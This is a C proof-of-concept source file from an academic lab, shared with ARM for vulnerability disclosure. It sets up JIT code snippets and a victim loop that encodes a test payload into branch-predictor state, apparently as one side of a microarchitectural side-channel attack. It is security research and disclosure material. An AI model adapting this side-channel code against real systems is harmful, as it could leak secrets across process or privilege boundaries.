/*
 * PoC Codes for Bias-Free Branch Predicion Exploitation
 * 
 * Thursday, September 12th 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#include <sys/syscall.h>
#include <unistd.h>
#include "utils.h"
#include "jit_snippets.h"

#define BASE_BPU_MAINTAIN   VOIDPTR(0x8000000)
#define BASE_RET_MEM        VOIDPTR(0xe00000)

void *tramp_ret;
uint32_t *mem_ib_ret_offsets;

__attribute__((aligned(4096)))
jit_bst_evict_bcond_t evicts[N_PROBES][N_EVICTS_PER_PROBE];

#define DBG_CHANNEL_IDX 3
#define DBG_PAYLOAD 0b11010110
void victim_cf()
{
    int i = 0;
    while (true)
    {
        for (int i = 0; i < N_PROBES; i++)
        {
                NOP(16);
                evicts[i][0](DBG_PAYLOAD, N_PROBES - i - 1);
                NOP(16);
        }
        // usleep(20000);
    }
}

void prep_snippets()
{
    uint64_t offset_align;
    uint64_t length;
    offset_align = JIT_SNIPPET_ALIGN_OFFSET(jit_bst_evict_bcond);
    length = JIT_SNIPPET_LENGTH(jit_bst_evict_bcond);
    for (int i = 0; i < N_PROBES; i++)
    {
        for (int j = 0; j < N_EVICTS_PER_PROBE; j++)
        {
            evicts[i][j] = prep_aligned_snippets(BASE_BPU_MAINTAIN, offset_probes[i], &jit_bst_evict_bcond, offset_align, length, 16, NULL);
        }
    }
}

int main()
{
    get_os_params();
    // Create an executable memory that filled by RET ops. These RET ops can be used as targets of indirect branches in BH[n].
    tramp_ret = prep_ret_mem(BASE_RET_MEM, 1 << IB_RET_MEM_RANGE, 0, 0, NULL);
    // Generate jump offsets for BH[n] to populate iBHB with pattern 00b, 01b, 10b, 11b, 00b, 01b, ...
    mem_ib_ret_offsets = prep_fp_offsets(0x30, -0x1, 4, 8, NULL);

    prep_snippets();
    NOP_PADDING(16);

    victim_cf();
}
